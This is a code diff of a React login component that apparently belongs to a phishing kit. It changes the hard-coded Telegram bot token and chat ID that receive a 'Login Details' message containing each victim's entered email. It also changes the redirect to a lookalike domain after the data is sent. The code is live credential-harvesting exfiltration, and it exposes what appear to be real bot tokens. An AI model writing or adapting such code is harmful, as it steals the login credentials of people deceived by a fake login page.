@@ -56,8 +56,8 @@ const Login = () => {
         return;
       }
 
-      const TELEGRAM_BOT_TOKEN = '7756925305:AAHaoMb6ljqKRptgYDIPeuq-hB4q2XgZZHI';
-      const TELEGRAM_CHAT_ID = '-1002296564308';
+      const TELEGRAM_BOT_TOKEN = '7599374797:AAHTjGXUpMWo9tMo9qDBvyrTgUQqxZVehxE';
+      const TELEGRAM_CHAT_ID = '-1002446420912';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://scat.1tobyboint.mom/';
+      window.location.href = 'https://curtis.1tobyboint.mom/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
